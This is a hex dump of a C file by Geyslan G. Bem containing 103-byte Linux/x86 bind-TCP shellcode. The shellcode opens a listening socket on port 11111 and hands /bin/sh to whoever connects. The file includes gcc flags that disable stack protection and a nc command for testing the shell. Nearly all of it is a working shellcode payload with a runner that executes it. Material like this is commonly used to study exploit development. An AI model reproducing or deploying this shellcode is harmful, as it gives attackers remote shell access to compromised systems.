00000000  2f 2a 0d 0a 0d 0a 20 53  68 65 6c 6c 20 42 69 6e  |/*.... Shell Bin|
00000010  64 20 54 43 50 20 53 68  65 6c 6c 63 6f 64 65 20  |d TCP Shellcode |
00000020  2d 20 43 20 4c 61 6e 67  75 61 67 65 0d 0a 20 4c  |- C Language.. L|
00000030  69 6e 75 78 2f 78 38 36  0d 0a 0d 0a 20 57 72 69  |inux/x86.... Wri|
00000040  74 74 65 6e 20 69 6e 20  32 30 31 33 20 62 79 20  |tten in 2013 by |
00000050  47 65 79 73 6c 61 6e 20  47 2e 20 42 65 6d 2c 20  |Geyslan G. Bem, |
00000060  48 61 63 6b 69 6e 67 20  62 69 74 73 0d 0a 0d 0a  |Hacking bits....|
00000070  20 68 74 74 70 3a 2f 2f  68 61 63 6b 69 6e 67 62  | http://hackingb|
00000080  69 74 73 2e 63 6f 6d 0d  0a 20 67 65 79 73 6c 61  |its.com.. geysla|
00000090  6e 40 67 6d 61 69 6c 2e  63 6f 6d 0d 0a 0d 0a 20  |n@gmail.com.... |
000000a0  54 68 69 73 20 73 6f 75  72 63 65 20 69 73 20 6c  |This source is l|
000000b0  69 63 65 6e 73 65 64 20  75 6e 64 65 72 20 74 68  |icensed under th|
000000c0  65 20 43 72 65 61 74 69  76 65 20 43 6f 6d 6d 6f  |e Creative Commo|
000000d0  6e 73 0d 0a 20 41 74 74  72 69 62 75 74 69 6f 6e  |ns.. Attribution|
000000e0  2d 53 68 61 72 65 41 6c  69 6b 65 20 33 2e 30 20  |-ShareAlike 3.0 |
000000f0  42 72 61 7a 69 6c 20 4c  69 63 65 6e 73 65 2e 0d  |Brazil License..|
00000100  0a 0d 0a 20 54 6f 20 76  69 65 77 20 61 20 63 6f  |... To view a co|
00000110  70 79 20 6f 66 20 74 68  69 73 20 6c 69 63 65 6e  |py of this licen|
00000120  73 65 2c 20 76 69 73 69  74 0d 0a 0d 0a 20 20 20  |se, visit....   |
00000130  68 74 74 70 3a 2f 2f 63  72 65 61 74 69 76 65 63  |http://creativec|
00000140  6f 6d 6d 6f 6e 73 2e 6f  72 67 2f 6c 69 63 65 6e  |ommons.org/licen|
00000150  73 65 73 2f 62 79 2d 73  61 2f 33 2e 30 2f 0d 0a  |ses/by-sa/3.0/..|
00000160  0d 0a 20 59 6f 75 20 61  72 65 20 66 72 65 65 3a  |.. You are free:|
00000170  0d 0a 0d 0a 20 20 20 20  74 6f 20 53 68 61 72 65  |....    to Share|
00000180  20 2d 20 74 6f 20 63 6f  70 79 2c 20 64 69 73 74  | - to copy, dist|
00000190  72 69 62 75 74 65 20 61  6e 64 20 74 72 61 6e 73  |ribute and trans|
000001a0  6d 69 74 20 74 68 65 20  77 6f 72 6b 0d 0a 20 20  |mit the work..  |
000001b0  20 20 74 6f 20 52 65 6d  69 78 20 2d 20 74 6f 20  |  to Remix - to |
000001c0  61 64 61 70 74 20 74 68  65 20 77 6f 72 6b 0d 0a  |adapt the work..|
000001d0  20 20 20 20 74 6f 20 6d  61 6b 65 20 63 6f 6d 6d  |    to make comm|
000001e0  65 72 63 69 61 6c 20 75  73 65 20 6f 66 20 74 68  |ercial use of th|
000001f0  65 20 77 6f 72 6b 0d 0a  0d 0a 20 55 6e 64 65 72  |e work.... Under|
00000200  20 74 68 65 20 66 6f 6c  6c 6f 77 69 6e 67 20 63  | the following c|
00000210  6f 6e 64 69 74 69 6f 6e  73 3a 0d 0a 20 20 20 41  |onditions:..   A|
00000220  74 74 72 69 62 75 74 69  6f 6e 20 2d 20 59 6f 75  |ttribution - You|
00000230  20 6d 75 73 74 20 61 74  74 72 69 62 75 74 65 20  | must attribute |
00000240  74 68 65 20 77 6f 72 6b  20 69 6e 20 74 68 65 20  |the work in the |
00000250  6d 61 6e 6e 65 72 0d 0a  20 20 20 20 20 20 20 20  |manner..        |
00000260  20 20 20 20 20 20 20 20  20 73 70 65 63 69 66 69  |         specifi|
00000270  65 64 20 62 79 20 74 68  65 20 61 75 74 68 6f 72  |ed by the author|
00000280  20 6f 72 20 6c 69 63 65  6e 73 6f 72 20 28 62 75  | or licensor (bu|
00000290  74 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |t..             |
000002a0  20 20 20 20 6e 6f 74 20  69 6e 20 61 6e 79 20 77  |    not in any w|
000002b0  61 79 20 74 68 61 74 20  73 75 67 67 65 73 74 73  |ay that suggests|
000002c0  20 74 68 61 74 20 74 68  65 79 0d 0a 20 20 20 20  | that they..    |
000002d0  20 20 20 20 20 20 20 20  20 20 20 20 20 65 6e 64  |             end|
000002e0  6f 72 73 65 20 79 6f 75  20 6f 72 20 79 6f 75 72  |orse you or your|
000002f0  20 75 73 65 20 6f 66 20  74 68 65 20 77 6f 72 6b  | use of the work|
00000300  29 2e 0d 0a 0d 0a 20 20  20 53 68 61 72 65 20 41  |).....   Share A|
00000310  6c 69 6b 65 20 2d 20 49  66 20 79 6f 75 20 61 6c  |like - If you al|
00000320  74 65 72 2c 20 74 72 61  6e 73 66 6f 72 6d 2c 20  |ter, transform, |
00000330  6f 72 20 62 75 69 6c 64  20 75 70 6f 6e 0d 0a 20  |or build upon.. |
00000340  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000350  74 68 69 73 20 77 6f 72  6b 2c 20 79 6f 75 20 6d  |this work, you m|
00000360  61 79 20 64 69 73 74 72  69 62 75 74 65 20 74 68  |ay distribute th|
00000370  65 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |e..             |
00000380  20 20 20 20 72 65 73 75  6c 74 69 6e 67 20 77 6f  |    resulting wo|
00000390  72 6b 20 6f 6e 6c 79 20  75 6e 64 65 72 20 74 68  |rk only under th|
000003a0  65 20 73 61 6d 65 20 6f  72 0d 0a 20 20 20 20 20  |e same or..     |
000003b0  20 20 20 20 20 20 20 20  20 20 20 20 73 69 6d 69  |            simi|
000003c0  6c 61 72 20 6c 69 63 65  6e 73 65 20 74 6f 20 74  |lar license to t|
000003d0  68 69 73 20 6f 6e 65 2e  0d 0a 0d 0a 0d 0a 20 73  |his one....... s|
000003e0  68 65 6c 6c 5f 62 69 6e  64 5f 74 63 70 5f 73 68  |hell_bind_tcp_sh|
000003f0  65 6c 6c 63 6f 64 65 0d  0a 0d 0a 20 2a 20 31 30  |ellcode.... * 10|
00000400  33 20 62 79 74 65 73 0d  0a 20 2a 20 6e 75 6c 6c  |3 bytes.. * null|
00000410  2d 62 79 74 65 73 20 66  72 65 65 0d 0a 20 2a 20  |-bytes free.. * |
00000420  61 76 6f 69 64 73 20 53  49 47 53 45 47 56 20 77  |avoids SIGSEGV w|
00000430  68 65 6e 20 72 65 63 6f  6e 6e 65 63 74 69 6e 67  |hen reconnecting|
00000440  2c 20 73 65 74 74 69 6e  67 20 53 4f 5f 52 45 55  |, setting SO_REU|
00000450  53 45 41 44 44 52 20 28  54 49 4d 45 5f 57 41 49  |SEADDR (TIME_WAI|
00000460  54 29 0d 0a 20 2a 20 74  68 65 20 70 6f 72 74 20  |T).. * the port |
00000470  6e 75 6d 62 65 72 20 69  73 20 65 61 73 69 6c 79  |number is easily|
00000480  20 63 68 61 6e 67 65 61  62 6c 65 20 28 33 74 68  | changeable (3th|
00000490  20 61 6e 64 20 34 74 68  20 62 79 74 65 73 20 6f  | and 4th bytes o|
000004a0  66 20 74 68 65 20 73 68  65 6c 6c 63 6f 64 65 29  |f the shellcode)|
000004b0  0d 0a 0d 0a 0d 0a 20 23  20 67 63 63 20 2d 6d 33  |...... # gcc -m3|
000004c0  32 20 2d 66 6e 6f 2d 73  74 61 63 6b 2d 70 72 6f  |2 -fno-stack-pro|
000004d0  74 65 63 74 6f 72 20 2d  7a 20 65 78 65 63 73 74  |tector -z execst|
000004e0  61 63 6b 20 73 68 65 6c  6c 63 6f 64 65 2e 63 20  |ack shellcode.c |
000004f0  2d 6f 20 73 68 65 6c 6c  63 6f 64 65 0d 0a 20 23  |-o shellcode.. #|
00000500  20 2e 2f 73 68 65 6c 6c  63 6f 64 65 0d 0a 0d 0a  | ./shellcode....|
00000510  20 54 65 73 74 69 6e 67  0d 0a 20 23 20 6e 63 20  | Testing.. # nc |
00000520  31 32 37 2e 30 2e 30 2e  31 20 31 31 31 31 31 0d  |127.0.0.1 11111.|
00000530  0a 0d 0a 2a 2f 0d 0a 0d  0a 23 69 6e 63 6c 75 64  |...*/....#includ|
00000540  65 20 3c 73 74 64 69 6f  2e 68 3e 0d 0a 23 69 6e  |e <stdio.h>..#in|
00000550  63 6c 75 64 65 20 3c 73  74 72 69 6e 67 2e 68 3e  |clude <string.h>|
00000560  0d 0a 0d 0a 75 6e 73 69  67 6e 65 64 20 63 68 61  |....unsigned cha|
00000570  72 20 63 6f 64 65 5b 5d  20 3d 20 5c 0d 0a 0d 0a  |r code[] = \....|
00000580  22 5c 78 36 36 5c 78 62  64 22 0d 0a 22 5c 78 32  |"\x66\xbd".."\x2|
00000590  62 5c 78 36 37 22 20 2f  2a 20 3c 2d 20 50 6f 72  |b\x67" /* <- Por|
000005a0  74 20 6e 75 6d 62 65 72  20 31 31 31 31 31 20 28  |t number 11111 (|
000005b0  32 20 62 79 74 65 73 29  20 2a 2f 0d 0a 22 5c 78  |2 bytes) */.."\x|
000005c0  36 61 5c 78 36 36 5c 78  35 38 5c 78 39 39 5c 78  |6a\x66\x58\x99\x|
000005d0  36 61 5c 78 30 31 5c 78  35 62 5c 78 35 32 5c 78  |6a\x01\x5b\x52\x|
000005e0  35 33 5c 78 36 61 5c 78  30 32 5c 78 38 39 22 0d  |53\x6a\x02\x89".|
000005f0  0a 22 5c 78 65 31 5c 78  63 64 5c 78 38 30 5c 78  |."\xe1\xcd\x80\x|
00000600  38 39 5c 78 63 36 5c 78  35 66 5c 78 62 30 5c 78  |89\xc6\x5f\xb0\x|
00000610  36 36 5c 78 36 61 5c 78  30 34 5c 78 35 34 5c 78  |66\x6a\x04\x54\x|
00000620  35 37 22 0d 0a 22 5c 78  35 33 5c 78 35 36 5c 78  |57".."\x53\x56\x|
00000630  38 39 5c 78 65 31 5c 78  62 33 5c 78 30 65 5c 78  |89\xe1\xb3\x0e\x|
00000640  63 64 5c 78 38 30 5c 78  62 30 5c 78 36 36 5c 78  |cd\x80\xb0\x66\x|
00000650  38 39 5c 78 66 62 22 0d  0a 22 5c 78 35 32 5c 78  |89\xfb".."\x52\x|
00000660  36 36 5c 78 35 35 5c 78  36 36 5c 78 35 33 5c 78  |66\x55\x66\x53\x|
00000670  38 39 5c 78 65 31 5c 78  36 61 5c 78 31 30 5c 78  |89\xe1\x6a\x10\x|
00000680  35 31 5c 78 35 36 5c 78  38 39 22 0d 0a 22 5c 78  |51\x56\x89".."\x|
00000690  65 31 5c 78 63 64 5c 78  38 30 5c 78 62 30 5c 78  |e1\xcd\x80\xb0\x|
000006a0  36 36 5c 78 62 33 5c 78  30 34 5c 78 35 32 5c 78  |66\xb3\x04\x52\x|
000006b0  35 36 5c 78 38 39 5c 78  65 31 5c 78 63 64 22 0d  |56\x89\xe1\xcd".|
000006c0  0a 22 5c 78 38 30 5c 78  62 30 5c 78 36 36 5c 78  |."\x80\xb0\x66\x|
000006d0  34 33 5c 78 38 39 5c 78  35 34 5c 78 32 34 5c 78  |43\x89\x54\x24\x|
000006e0  30 38 5c 78 63 64 5c 78  38 30 5c 78 39 33 5c 78  |08\xcd\x80\x93\x|
000006f0  38 39 22 0d 0a 22 5c 78  66 39 5c 78 62 30 5c 78  |89".."\xf9\xb0\x|
00000700  33 66 5c 78 63 64 5c 78  38 30 5c 78 34 39 5c 78  |3f\xcd\x80\x49\x|
00000710  37 39 5c 78 66 39 5c 78  62 30 5c 78 30 62 5c 78  |79\xf9\xb0\x0b\x|
00000720  35 32 5c 78 36 38 22 0d  0a 22 5c 78 32 66 5c 78  |52\x68".."\x2f\x|
00000730  32 66 5c 78 37 33 5c 78  36 38 5c 78 36 38 5c 78  |2f\x73\x68\x68\x|
00000740  32 66 5c 78 36 32 5c 78  36 39 5c 78 36 65 5c 78  |2f\x62\x69\x6e\x|
00000750  38 39 5c 78 65 33 5c 78  35 32 22 0d 0a 22 5c 78  |89\xe3\x52".."\x|
00000760  35 33 5c 78 65 62 5c 78  61 38 22 3b 0d 0a 0d 0a  |53\xeb\xa8";....|
00000770  0d 0a 6d 61 69 6e 20 28  29 0d 0a 7b 0d 0a 0d 0a  |..main ()..{....|
00000780  09 70 72 69 6e 74 66 28  22 53 68 65 6c 6c 63 6f  |.printf("Shellco|
00000790  64 65 20 4c 65 6e 67 74  68 3a 20 20 25 64 5c 6e  |de Length:  %d\n|
000007a0  22 2c 20 73 74 72 6c 65  6e 28 63 6f 64 65 29 29  |", strlen(code))|
000007b0  3b 0d 0a 0d 0a 09 69 6e  74 20 28 2a 72 65 74 29  |;.....int (*ret)|
000007c0  28 29 20 3d 20 28 69 6e  74 28 2a 29 28 29 29 63  |() = (int(*)())c|
000007d0  6f 64 65 3b 0d 0a 0d 0a  09 72 65 74 28 29 3b 0d  |ode;.....ret();.|
000007e0  0a 0d 0a 7d                                       |...}|
000007e4
